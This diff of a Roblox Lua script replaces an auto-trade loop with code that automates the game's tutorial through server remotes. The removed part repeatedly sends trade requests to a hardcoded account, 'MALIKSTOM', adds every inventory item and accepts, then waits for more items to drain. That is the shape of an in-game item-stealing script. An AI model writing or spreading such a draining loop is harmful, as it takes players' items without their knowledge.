@@ -1,288 +1,179 @@
-local rs = game:GetService("ReplicatedStorage")
-local player = game.Players.LocalPlayer
-local paper = require(rs:WaitForChild("Paper"))
-local tradeRemote = rs.Paper.Remotes.Trade
-local network = paper.Network
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local UserInputService = game:GetService("UserInputService")
+local Paper = require(ReplicatedStorage:WaitForChild("Paper"))
 
-local targetName = "MALIKSTOM"
-local targetPlayer = nil
-local isTrading = true
-local isFarming = false
+local Stats = Paper.Stats
+local Network = Paper.Network
 
--- Create UI for status only
-local screenGui = Instance.new("ScreenGui")
-screenGui.Parent = player.PlayerGui
+repeat task.wait() until Stats.IsLoaded(LocalPlayer)
 
-local mainFrame = Instance.new("Frame")
-mainFrame.Size = UDim2.new(0, 320, 0, 180)
-mainFrame.Position = UDim2.new(0, 10, 0, 10)
-mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-mainFrame.BackgroundTransparency = 0.1
-mainFrame.BorderSizePixel = 1
-mainFrame.BorderColor3 = Color3.fromRGB(255, 215, 0)
-mainFrame.Parent = screenGui
+local Tutorial = Stats.Get("Tutorial")
+local Strength = Stats.Get("Strength")
+local Money = Stats.Get("Money")
+local PetCount = Stats.Get("PetCount")
+local Throws = Stats.Get("Throws")
 
-local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, 0, 0, 35)
-title.Text = "AUTO TRADE v2 - RUNNING"
-title.TextColor3 = Color3.fromRGB(255, 215, 0)
-title.BackgroundTransparency = 1
-title.TextSize = 16
-title.Font = Enum.Font.GothamBold
-title.Parent = mainFrame
+local Remotes = ReplicatedStorage:WaitForChild("Paper"):WaitForChild("Remotes")
+local RemoteFunction = Remotes:WaitForChild("__remotefunction")
 
-local statusBox = Instance.new("Frame")
-statusBox.Size = UDim2.new(0, 300, 0, 120)
-statusBox.Position = UDim2.new(0, 10, 0, 45)
-statusBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-statusBox.BackgroundTransparency = 0.5
-statusBox.BorderSizePixel = 1
-statusBox.BorderColor3 = Color3.fromRGB(80, 80, 80)
-statusBox.Parent = mainFrame
+local AutoThrowActive = false
+local AutoTrainActive = false
+local AutoThrowTimer = nil
 
-local statusLabel = Instance.new("TextLabel")
-statusLabel.Size = UDim2.new(1, -10, 1, -10)
-statusLabel.Position = UDim2.new(0, 5, 0, 5)
-statusLabel.Text = "Starting..."
-statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
-statusLabel.BackgroundTransparency = 1
-statusLabel.TextWrapped = true
-statusLabel.TextXAlignment = Enum.TextXAlignment.Left
-statusLabel.TextYAlignment = Enum.TextYAlignment.Top
-statusLabel.TextSize = 12
-statusLabel.Font = Enum.Font.Gotham
-statusLabel.Parent = statusBox
-
-local function updateStatus(text)
-    statusLabel.Text = text
-    print("[STATUS] " .. text)
-end
-
--- Function to check if player has any items
-local function hasAnyItems()
-    local itemsData = paper.Stats.Get("Items").Value
-    for itemName, amount in pairs(itemsData) do
-        if amount > 0 then
-            return true
+local function ToggleAutoThrow()
+    if AutoThrowActive then
+        if AutoThrowTimer then
+            task.cancel(AutoThrowTimer)
+            AutoThrowTimer = nil
         end
-    end
-    return false
-end
-
--- Function to get total item count
-local function getTotalItemCount()
-    local itemsData = paper.Stats.Get("Items").Value
-    local count = 0
-    for itemName, amount in pairs(itemsData) do
-        if amount > 0 then
-            count = count + amount
+        if Stats.Get("AutoThrow").Value then
+            Network.FireServer("Toggle Setting", "AutoThrow")
         end
-    end
-    return count
-end
-
--- Monitor inventory for changes
-local function waitForItems()
-    updateStatus("No items in inventory. Waiting for new items...")
-    
-    -- Store current inventory state
-    local lastItemCount = getTotalItemCount()
-    
-    while isTrading do
-        task.wait(2) -- Check every 2 seconds
-        local currentCount = getTotalItemCount()
-        
-        if currentCount > 0 then
-            updateStatus("Detected " .. currentCount .. " items in inventory! Resuming trades...")
-            return true
-        elseif currentCount ~= lastItemCount then
-            updateStatus("Inventory changed but still empty. Waiting...")
+        AutoThrowActive = false
+        print("[AutoThrow] Disabled")
+    else
+        if not Stats.Get("AutoThrow").Value then
+            Network.FireServer("Toggle Setting", "AutoThrow")
         end
-        lastItemCount = currentCount
-    end
-    return false
-end
-
--- Farm eggs and codes
-local function farmEggsAndCodes()
-    if isFarming then return end
-    isFarming = true
-    
-    updateStatus("Starting Egg Hunt...")
-    
-    local eggHuntConfig = require(rs:WaitForChild("Tables").EggHunt)
-    local stats = paper.Stats
-    
-    for eggName, _ in pairs(eggHuntConfig) do
-        pcall(function()
-            paper.Network.InvokeServer("Claim Egg", eggName)
+        AutoThrowActive = true
+        print("[AutoThrow] Enabled")
+        AutoThrowTimer = task.delay(10, function()
+            if AutoThrowActive then
+                ToggleAutoThrow()
+            end
         end)
-        task.wait(0.1)
     end
-    updateStatus("Egg claiming done")
-    task.wait(1)
-    
-    local eggHuntData = stats.Get("EggHuntData")
-    local foundEggs = eggHuntData.Value.FoundEggs or {}
-    local claimedEggs = eggHuntData.Value.ClaimedEggs or {}
-    
-    for eggName, _ in pairs(foundEggs) do
-        if not claimedEggs[eggName] then
-            pcall(function()
-                paper.Network.InvokeServer("Claim Egg Reward", eggName)
-            end)
-            task.wait(0.1)
+end
+
+local function ToggleAutoTrain()
+    if AutoTrainActive then
+        Network.FireServer("Stop Training")
+        LocalPlayer:SetAttribute("TrainingStation", nil)
+        if Stats.Get("AutoTrain").Value then
+            Network.FireServer("Toggle Setting", "AutoTrain")
         end
-    end
-    updateStatus("Egg rewards claimed")
-    task.wait(1)
-    
-    updateStatus("Redeeming codes...")
-    local codes = {
-        "update1", "update2", "update3", "update4", "update5",
-        "easter", "10kccu", "RELEASE"
-    }
-    
-    local remote = rs:WaitForChild("Paper"):WaitForChild("Remotes"):WaitForChild("__remotefunction")
-    
-    for _, code in ipairs(codes) do
-        pcall(function()
-            remote:InvokeServer("Redeem Code", code)
+        AutoTrainActive = false
+        print("[AutoTrain] Disabled")
+    else
+        if not Stats.Get("AutoTrain").Value then
+            Network.FireServer("Toggle Setting", "AutoTrain")
+        end
+        AutoTrainActive = true
+        print("[AutoTrain] Enabled")
+        task.spawn(function()
+            task.wait(10)
+            if AutoTrainActive then
+                ToggleAutoTrain()
+            end
         end)
-        task.wait(0.5)
-    end
-    updateStatus("Codes redeemed")
-    
-    isFarming = false
-end
-
--- Send trade request and wait for UI to open
-local function sendTradeAndWaitForUI()
-    targetPlayer = game.Players:FindFirstChild(targetName)
-    if not targetPlayer then
-        return false, nil
-    end
-    
-    updateStatus("Sending trade request to " .. targetName)
-    network.FireServer("Sent Trade Request", targetPlayer)
-    
-    -- Wait for trade UI to open (this only happens if they accept)
-    local menus = player.PlayerGui:WaitForChild("Menus")
-    local startTime = tick()
-    
-    repeat
-        task.wait(0.5)
-        local tradingFrame = menus:FindFirstChild("Trading")
-        if tradingFrame and tradingFrame:FindFirstChild("Frame") then
-            return true, tradingFrame.Frame
-        end
-        -- Timeout after 10 seconds, resend
-        if tick() - startTime > 10 then
-            return false, nil
-        end
-    until false
-end
-
--- Add all items to trade
-local function addAllItems(frame)
-    updateStatus("Adding all items...")
-    
-    repeat
-        task.wait(0.1)
-    until frame.My and frame.My.Items
-    
-    task.wait(1.5)
-    
-    local itemsData = paper.Stats.Get("Items").Value
-    local itemList = {}
-    
-    for itemName, amount in pairs(itemsData) do
-        if amount > 0 then
-            table.insert(itemList, {name = itemName, amount = amount})
-        end
-    end
-    
-    -- Double check we still have items before trading
-    if #itemList == 0 then
-        updateStatus("No items found before trading, skipping...")
-        return false
-    end
-    
-    for _, item in ipairs(itemList) do
-        for retry = 1, 3 do
-            tradeRemote:FireServer("Item", item.name, item.amount)
-            task.wait(0.15)
-        end
-        updateStatus("Added: " .. item.name .. " x" .. item.amount)
-    end
-    
-    task.wait(1)
-    updateStatus("Accepting trade...")
-    tradeRemote:FireServer("Accept")
-    updateStatus("Trade complete, waiting for next cycle")
-    task.wait(8)
-    return true
-end
-
--- Main auto loop
-local function startAuto()
-    updateStatus("Starting auto trade - target: " .. targetName)
-    
-    -- Farm eggs and codes first
-    farmEggsAndCodes()
-    updateStatus("Farm complete, starting trade loop")
-    
-    -- Infinite trade loop
-    while isTrading do
-        -- Check if we have items before starting a trade cycle
-        if not hasAnyItems() then
-            updateStatus("No items in inventory! Waiting for new items...")
-            local gotItems = waitForItems()
-            if not gotItems then
-                updateStatus("Script stopped or no items detected")
-                break
-            end
-        end
-        
-        -- Keep sending requests until trade UI opens
-        local success = false
-        local frame = nil
-        
-        while not success and isTrading do
-            -- Re-check items before each trade attempt
-            if not hasAnyItems() then
-                updateStatus("Items depleted during trade attempts! Waiting for new items...")
-                local gotItems = waitForItems()
-                if not gotItems then
-                    break
-                end
-            end
-            
-            targetPlayer = game.Players:FindFirstChild(targetName)
-            if not targetPlayer then
-                updateStatus("Waiting for " .. targetName .. " to join...")
-                task.wait(5)
-            else
-                success, frame = sendTradeAndWaitForUI()
-                if not success then
-                    updateStatus("No response, sending again in 5 seconds...")
-                    task.wait(5)
-                end
-            end
-        end
-        
-        -- Trade UI opened, add items and complete
-        if success and frame then
-            local tradeCompleted = addAllItems(frame)
-            if not tradeCompleted then
-                updateStatus("Trade failed - no items available")
-            end
-        end
-        
-        -- Reset for next trade
-        task.wait(3)
     end
 end
 
--- Start everything automatically
-task.spawn(startAuto)
+local function ForceJump()
+    local character = LocalPlayer.Character
+    if not character then return end
+    local humanoid = character:FindFirstChild("Humanoid")
+    if not humanoid then return end
+    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+    task.wait(0.05)
+    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+    UserInputService:SetKeyDown(true, Enum.KeyCode.Space)
+    task.wait(0.1)
+    UserInputService:SetKeyDown(false, Enum.KeyCode.Space)
+end
+
+local function MoveOffPad()
+    local character = LocalPlayer.Character
+    if not character then return end
+    local hrp = character:FindFirstChild("HumanoidRootPart")
+    if not hrp then return end
+    hrp.AssemblyLinearVelocity = Vector3.new(0, 20, -25)
+    task.wait(0.2)
+    hrp.AssemblyLinearVelocity = Vector3.new(0, 15, -15)
+end
+
+local function BuyEgg()
+    local args = { "Hatch Egg", "Basic Egg", 1 }
+    RemoteFunction:InvokeServer(unpack(args))
+    print("[BuyEgg] Purchased Basic Egg")
+end
+
+local function DoRebirth()
+    local args = { "Rebirth", 1 }
+    RemoteFunction:InvokeServer(unpack(args))
+    print("[Rebirth] Performed Rebirth")
+end
+
+local function RunStrengthTrain()
+    ToggleAutoTrain()
+    task.wait(0.5)
+    for i = 10, 1, -1 do
+        task.wait(1)
+    end
+    ToggleAutoTrain()
+    task.wait(0.3)
+    for i = 1, 3 do
+        ForceJump()
+        task.wait(0.2)
+    end
+    MoveOffPad()
+    task.wait(0.3)
+    ForceJump()
+    print("[StrengthTrain] Completed training session")
+end
+
+local function HandleTutorialStep()
+    local step = Tutorial.Value
+    print("[Tutorial] Current step: " .. step)
+    
+    if step == 1 then
+        print("[Tutorial] Step 1: Throw your rock - enabling AutoThrow")
+        ToggleAutoThrow()
+    elseif step == 2 then
+        print("[Tutorial] Step 2: Buy a Basic Egg")
+        BuyEgg()
+    elseif step == 3 then
+        print("[Tutorial] Step 3: Get 175 Strength - training")
+        RunStrengthTrain()
+    elseif step == 4 then
+        print("[Tutorial] Step 4: Get 300 Money - enabling AutoThrow")
+        ToggleAutoThrow()
+    elseif step == 5 then
+        print("[Tutorial] Step 5: Buy the next item")
+    elseif step == 6 then
+        print("[Tutorial] Step 6: Get 225 Money - enabling AutoThrow")
+        ToggleAutoThrow()
+    elseif step == 7 then
+        print("[Tutorial] Step 7: Get 3 More Pets")
+        for i = 1, 4 do
+            BuyEgg()
+            task.wait(1)
+        end
+    elseif step == 8 then
+        print("[Tutorial] Step 8: Get 500 Strength - training")
+        RunStrengthTrain()
+    elseif step == 9 then
+        print("[Tutorial] Step 9: Get 750 Strength on better wall - training")
+        RunStrengthTrain()
+    elseif step == 10 then
+        print("[Tutorial] Step 10: Throw item to afford rebirth - enabling AutoThrow")
+        ToggleAutoThrow()
+    elseif step == 11 then
+        print("[Tutorial] Step 11: Buy first Rebirth")
+        DoRebirth()
+    elseif step == 12 then
+        print("[Tutorial] Step 12: Tutorial complete!")
+        if AutoThrowActive then ToggleAutoThrow() end
+        if AutoTrainActive then ToggleAutoTrain() end
+    end
+end
+
+Tutorial.Changed:Connect(function()
+    HandleTutorialStep()
+end)
+
+HandleTutorialStep()
+
+print("[Tutorial Auto-Complete] Loaded and waiting for tutorial steps")
